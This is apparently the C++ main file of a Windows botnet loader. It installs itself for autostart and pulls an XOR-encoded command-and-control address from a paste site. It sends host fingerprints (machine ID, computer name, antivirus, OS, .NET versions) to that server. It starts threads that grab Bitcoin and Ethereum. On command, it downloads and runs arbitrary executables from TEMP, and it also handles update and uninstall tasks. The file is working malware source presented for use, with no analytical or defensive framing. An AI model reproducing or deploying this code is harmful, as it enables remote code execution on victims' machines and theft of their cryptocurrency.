#include <stdio.h>
#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#include <ShellAPI.h>
#include <wbemidl.h>
#include "config.h"
#include <conio.h>
#include "CoinFinder.h"
#include <atlbase.h>
#include <wtypes.h>
#include <comutil.h>
#include "Helpers.hpp"
#pragma comment(lib,"comsuppw.lib")
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"wbemuuid")

std::string encryptDecrypt(std::string toEncrypt) {
	Config config;
	std::string output = toEncrypt;
	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ config.key[i % (sizeof(config.key) / sizeof(char))];

	return output;
}

#if _DEBUG
int main(int argc, char* argv[]) {
#endif
#if NDEBUG 
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
#endif
		Config config;
	
		//Check if the Bot is Running
		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
			return -1; // quit; mutex is released automatically

		//Autostart && Clone
		if (config.startup == true) {
			std::string insatlled = Helpers::installedOrnot();
			if (insatlled == "restart") {
				return 0;
			}
			Helpers::addstartup();
		}

		//Fetch Gate from raw Site
		http::Request request(config.pastebinUrl);
		http::Response response = request.send("GET");
		std::string gateFromPatebin = encryptDecrypt(Helpers::responseToString(response));
		//Net Framwork Check
		std::string netFramework2 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
		std::string netFramework3 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
		std::string netFramework35 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
		std::string netFramework4 = Helpers::checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
		// Start Coin Grabber
		std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
		std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
		//Main
		while (true) {
			try {
				http::Request request2(gateFromPatebin);
				http::Response respons2e = request2.send("POST",
					"hwid=" + Helpers::GetMachineGUID() +
					"&username=" + encryptDecrypt(Helpers::getComputerName()) +
					"&nf2=" + encryptDecrypt(netFramework2) +
					"&nf3=" + encryptDecrypt(netFramework3) +
					"&nf35=" + encryptDecrypt(netFramework35) +
					"&nf4=" + encryptDecrypt(netFramework4) +
					"&av=" + Helpers::getCurrentAv() +
					"&os=" + Helpers::GetWindowsVersionString() +
					"&botversion=" + encryptDecrypt("2.0"),
					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
				);
				std::string responseFromGate = Helpers::responseToString(respons2e);
				//TODO Handle Tasks Function
				//Java Support?
				//32x64 Bit CPU (&& Model?)
				std::cout << responseFromGate;
				std::string substring = "newtask";
				if (responseFromGate.find(substring) != std::string::npos) {
					//New task Found
					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
					std::string random_str = Helpers::RandomString(10);
					std::string url(v[2]);
					std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
					Helpers::downloadFile(url, file);
					std::string started = Helpers::startNewProcess(file);
					http::Request request2(gateFromPatebin);
					http::Response respons2e = request2.send("POST",
						"hwid=" + Helpers::GetMachineGUID() +
						"&username=" + Helpers::getComputerName() +
						"&ps=" + started +
						"&id=" + v[1],
						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
					);
					std::cout << started;
				}
				else {
					if (responseFromGate.find("uninstall") != std::string::npos) {
						t1.detach();
						t2.detach();
						Helpers::uninstall();
						return 0;
					}
					else if (responseFromGate.find("update") != std::string::npos) {
						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
						t1.detach();
						t2.detach();
						Helpers::update(v[2]);
						return 0;
					}
					// Else No new Task
				}
			}
			catch (const std::exception & e) {
				std::cerr << "Request failed, error: " << e.what() << std::endl;
			}
			Sleep(10000);
		}
}
